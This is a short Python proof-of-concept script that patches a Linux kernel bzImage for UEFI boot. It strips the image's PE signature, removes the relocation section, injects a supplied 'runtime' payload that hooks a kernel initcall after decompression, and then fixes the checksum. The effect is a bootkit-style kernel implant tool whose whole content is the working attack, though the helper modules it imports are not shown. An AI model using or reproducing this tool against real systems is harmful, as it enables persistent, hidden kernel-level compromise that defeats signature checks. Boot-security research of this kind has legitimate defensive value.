"""
PoC to patch a bzImage, only for uefi as we are hooking the the uefi functions
and rely on being able to create more sections.
"""
import argparse
from add_data import add_data
from pe import PERemoveSig, PECheckSumFix
from remove_reloc import remove_reloc
from utils import pad


def main():
    parser = argparse.ArgumentParser(
        prog='patch-bzimage',
        description='Installs the runtime in a kernel bzImage',
    )

    parser.add_argument('source_kernel')
    parser.add_argument('runtime')
    parser.add_argument('patched_kernel')
    parser.add_argument('--no-bios', action='store_false')
    parser.add_argument('--no-uefi', action='store_false')

    args = parser.parse_args()

    a = None

    with open(args.source_kernel, 'rb') as f:
        a = f.read()

    # remove the sig
    a = PERemoveSig(a).remove_sig()

    # Remove the reloc section in older kernels
    a = remove_reloc(a)

    # Adding our payload
    # this is the first stage that will patch the kernel after its been
    # decompressed, hooking an initcall and making sure our payload exists in
    # virtual memory.
    with open(args.runtime, 'rb') as f:
        payload = f.read()
        a = add_data(
            a,
            pad(payload, value=b'\x00'),
            apply_bios_patch=args.no_bios,
            apply_uefi_patch=args.no_uefi
        )

    # Checksum fixes for sanity
    # need to fix the bzImage checksum. Nothing really checks it, but lets do
    # it for completenes.
    last = PECheckSumFix(a).fix()
    with open(args.patched_kernel, 'wb') as f:
        f.write(last)


if __name__ == "__main__":
    main()
